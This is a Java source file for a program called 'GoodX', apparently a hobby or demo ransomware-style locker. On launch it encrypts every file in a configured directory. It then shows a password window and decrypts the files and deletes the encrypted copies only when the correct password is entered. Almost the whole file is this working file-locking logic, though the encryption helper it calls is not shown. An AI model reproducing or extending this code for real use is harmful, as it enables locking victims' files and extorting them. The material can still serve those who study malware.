package com.goodx;

import com.security.FileEncryption;
import com.security.FileEncryptionException;
import sun.rmi.runtime.Log;

import javax.crypto.Cipher;
import javax.swing.*;
import javax.swing.event.HyperlinkEvent;
import java.awt.*;
import java.io.File;
import java.io.IOException;
import java.net.URISyntaxException;
import java.util.Objects;

import static com.security.FileEncryption.getDirPath;
import static com.security.FileEncryption.getPassword;

/**
 * @Author Mustafa Jamal
 * @GitHub @doct0rX
 */
public class GoodX {

    private JButton submitButton;
    private JPanel goodMain;
    private JPasswordField passwordField;
    private JButton about️Button;
    private JTextArea enterTheKeyToTextArea;
    private static Dimension dimension = Toolkit.getDefaultToolkit().getScreenSize();
    private static boolean noPath = false;  // if no path for directory display msg and aport the app.
    private static boolean fileAlreadyEncrypted = false;

    private GoodX() {
        submitButton.addActionListener(event -> {
            char[] passwordInput = passwordField.getPassword();
            if (isPasswordCorrent(passwordInput)) {
                try {
                    chiperPathAndMode(getDirPath(), Cipher.DECRYPT_MODE);
                } catch (FileEncryptionException e) {
                    e.printStackTrace();
                }


                // for deleting .enc files after decrypting it.
                File file = new File(getDirPath());
                for (File f : Objects.requireNonNull(file.listFiles())) {
                    if (f.getName().endsWith(".enc")) {
                        f.delete();
                    }
                }

                JOptionPane.showMessageDialog(null, "Correct Password!!!\n---------------\n|    " + new String(passwordInput) + "    |\n---------------");
            } else {
                JOptionPane.showMessageDialog(null, "nope.");
            }
        });

        about️Button.addActionListener(e -> {
            JFrame aboutFrame = new JFrame("Follow doct0rX ;)");
            final JEditorPane editor = new JEditorPane();
            editor.setEditorKit(JEditorPane.createEditorKitForContentType("text/html"));
            editor.setEditable(false);
            String fontFamily = editor.getFont().getFamily();
            editor.setText("<html> <center> <br> <br>" +
                    "<body style=\"font-family: " + fontFamily + "\"<b> Follow Me On <br> Twitter: <a href=\"https://www.twitter.com/mustafaj4m\">mustafaj4m</a>, " +
                    "<br> GitHub: <a href=\"https://www.github.com/doct0rx\">Doct0rX</a>" +
                    "</center> </html>");
            editor.addHyperlinkListener(e12 -> {
                if(e12.getEventType() == HyperlinkEvent.EventType.ACTIVATED) {
                    if(Desktop.isDesktopSupported()) {
                        try {
                            Desktop.getDesktop().browse(e12.getURL().toURI());
                        } catch (IOException | URISyntaxException e1) {
                            e1.printStackTrace();
                        }
                    }
                }
            });
            aboutFrame.setSize(501, 155);
            aboutFrame.setLocation(dimension.width/2-aboutFrame.getSize().width/2, dimension.height/2-aboutFrame.getSize().height/2);
            aboutFrame.add(editor);
            aboutFrame.setVisible(true);
        });
    }

    /**
     * check if the password is correct or not
     * @param passwordInput array of char
     * @return boolean
     */
    private boolean isPasswordCorrent(char[] passwordInput) {
        return new String(passwordInput).equals(getPassword());
    }

   /*
   TODO: use this function for sanity check the code if the path leads to dir or file? or even empty dir or wrong path.
    */
    /**
     * check the file path is directory or file and return it as a File[]
     * -- it will exeute the encryption or decryption mecanism on files.
     * @param directoryPath path to directory or file.
     * @return void
     */
    private static void chiperPathAndMode(String directoryPath, int chiperMode) throws FileEncryptionException {
        File dir = new File(directoryPath);
        File[] directoryListing = dir.listFiles();
        if (directoryListing != null) {
            for (File child : directoryListing) {
                if (child.isFile()) {
                    Log.getLog("File ", child.getName(), 1);
                    new FileEncryption(child.toString(), getPassword(), (byte) chiperMode).start();
                }
            }
        } else {
            noPath = true;
            JOptionPane.showMessageDialog(null, "no such dir \n ~/Users/doct0rX/Desktop");
        }
    }

    public static void main(String[] args) throws FileEncryptionException {
        File file = new File(getDirPath());
        for (File f : Objects.requireNonNull(file.listFiles())) {
            if (f.getName().endsWith(".enc")) {
                fileAlreadyEncrypted = true;
            }
        }

        if (!fileAlreadyEncrypted) {
            chiperPathAndMode(getDirPath(), Cipher.ENCRYPT_MODE);
        }

        JFrame frame = new JFrame("GoodX");
        if (noPath) {
            frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        } else {
            frame.setContentPane(new GoodX().goodMain);
            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            frame.pack();
            frame.setSize(501, 251);
            frame.setLocation(dimension.width / 2 - frame.getSize().width / 2, dimension.height / 2 - frame.getSize().height / 2);
            frame.setVisible(true);
        }
    }
}
